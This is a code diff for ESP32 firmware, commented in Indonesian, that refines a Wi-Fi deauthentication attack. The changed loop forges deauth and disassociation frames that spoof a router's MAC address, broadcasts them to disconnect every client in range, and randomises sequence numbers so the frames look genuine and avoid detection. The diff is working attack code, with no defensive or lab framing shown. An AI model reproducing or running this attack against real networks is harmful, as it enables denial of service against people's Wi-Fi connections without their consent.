@@ -105,33 +105,47 @@ void loopWiFi(void * pvParameters) {
     } else if (isDeauthing && adaTarget) {
     esp_wifi_set_promiscuous(true);
     
-    uint8_t targetMac[6];
-    stringToMac(targetTerkunci.mac, targetMac);
+        uint8_t targetMac[6];
+    stringToMac(targetTerkunci.mac, targetMac); // Ini MAC Router
     
-    // Set Destination (Korban) & Source/BSSID (Router)
-    memcpy(&deauthFrame[4], targetMac, 6);
-    memcpy(&deauthFrame[10], targetMac, 6); // Anggap BSSID sama dengan Target (Broadcast mode)
-    memcpy(&deauthFrame[16], targetMac, 6);
-    
-    memcpy(&disasFrame[4], targetMac, 6);
-    memcpy(&disasFrame[10], targetMac, 6);
-    memcpy(&disasFrame[16], targetMac, 6);
+    // PELURU MAUT: Tembak ke semua HP yang ada di jangkauan router itu
+    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
+    // ==========================================
+    // 1. SETTING PAKET DEAUTH (0xc0)
+    // ==========================================
+    memcpy(&deauthFrame[4],  broadcastMac, 6); // TUJUAN: Semua HP
+    memcpy(&deauthFrame[10], targetMac,    6); // PENGIRIM: Nyamar jadi Router
+    memcpy(&deauthFrame[16], targetMac,    6); // BSSID: ID Jaringannya
+
+    // ==========================================
+    // 2. SETTING PAKET DISASSOCIATION (0xa0)
+    // ==========================================
+    memcpy(&disasFrame[4],  broadcastMac, 6);  // TUJUAN: Semua HP
+    memcpy(&disasFrame[10], targetMac,    6);  // PENGIRIM: Nyamar jadi Router
+    memcpy(&disasFrame[16], targetMac,    6);  // BSSID: ID Jaringannya
+
+    // Kunci Channel Target
     esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
 
-    // BURST MODE ALA GHOST-ESP (Tembak 2 jenis paket)
+    // BURST MODE: Tembak bertubi-tubi
     for(int i=0; i<20; i++) {
-        // Kasih Sequence Number Acak biar gak kedeteksi
+        // Acak Sequence Number biar kayak paket asli
         uint16_t seq = (uint16_t)(esp_random() & 0xFFFF);
         deauthFrame[22] = seq & 0xFF;
         deauthFrame[23] = (seq >> 8) & 0xFF;
+        disasFrame[22]  = seq & 0xFF;
+        disasFrame[23]  = (seq >> 8) & 0xFF;
         
+        // Tembak Deauth
         esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
-        delayMicroseconds(200); 
-        esp_wifi_80211_tx(WIFI_IF_STA, disasFrame, sizeof(disasFrame), false);
+        delayMicroseconds(500); // Kasih jeda dikit biar driver gak muntah
         
-        delayMicroseconds(200); 
+        // Tembak Disassociation
+        esp_wifi_80211_tx(WIFI_IF_STA, disasFrame, sizeof(disasFrame), false);
+        delayMicroseconds(500); 
     }
+
     esp_wifi_set_promiscuous(false);
     vTaskDelay(50 / portTICK_PERIOD_MS); 
 }
